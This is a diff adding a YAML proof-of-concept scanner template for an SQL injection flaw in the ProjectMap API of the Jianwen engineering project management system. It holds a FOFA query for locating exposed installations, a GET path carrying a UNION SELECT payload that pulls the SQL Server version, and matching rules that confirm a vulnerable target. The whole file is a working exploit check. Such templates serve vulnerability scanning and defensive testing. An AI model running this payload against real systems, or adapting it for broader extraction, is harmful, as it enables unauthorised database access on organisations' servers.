@@ -1,0 +1,17 @@
+id: poc-yaml-justwin-projectmap-sqli
+info:
+  name: 建文工程管理系统 ProjectMap SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 建文工程管理系统
+  fofa: body="建文工程项目管理软件"
+requests:
+- method: GET
+  path: /api/api/APM/KPI/PMDashBoard/ProjectMap/1')%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,@@VERSION--
+  expression: "status_code == 200 && \ncontains(body,\"\\\"StatusCode\\\":200\") &&\n\
+    contains(body,\"Microsoft SQL Server\") &&\ncontains(body,\"\\\"IsSuccess\\\"\
+    :true\") &&\ncontains(body,\"\\\"Message\\\":\\\"OK\\\"\") &&\ncontains(content_type,\"\
+    application/json\")\n"
+variables: {}
+transport: http
